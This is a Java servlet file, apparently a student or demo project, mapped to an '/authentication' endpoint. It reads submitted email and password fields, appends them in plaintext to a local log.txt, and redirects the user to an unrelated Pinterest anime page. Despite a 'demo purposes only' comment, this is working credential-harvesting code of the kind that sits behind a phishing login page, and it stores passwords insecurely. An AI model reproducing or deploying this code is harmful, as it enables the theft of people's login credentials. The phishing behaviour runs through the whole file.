package com.jetbrains.MyWebApp;

import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.*;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet("/authentication")
public class MyServlet extends HttpServlet {

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
//        response.setContentType("text/html");
//
//        PrintWriter out = response.getWriter();
//        out.write("<html>");
//        out.write("<head><title>Thanks!</title></head>");
//        //Responder al usuario
//        out.println("<html><body>");
//        out.println("<h3>Datos guardados exitosamente</h3>");
//        out.println("</body></html>");

        // URL a la que deseas redirigir
        String redirectUrl = "https://ar.pinterest.com/bluesai7u7/fotos-animes/";
        String filePath = System.getProperty("user.dir")+"\\log.txt";

        // Realiza la redirección
        response.sendRedirect(redirectUrl);

        // Demo purposes only - don't do this in production!
        String email = request.getParameter("email");
        String password = request.getParameter("password");

        //Guardar en el log.txt
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath, true))) {
            writer.write("Correo: " + email + ", Contraseña: " + password + "\n");
            System.out.println("Datos guardados exitosamente en " + filePath);
        } catch (IOException e) {
            e.printStackTrace();
        }
        //System.out.println("Guardado exitosamente");
    }
    public void destroy() {
    }
}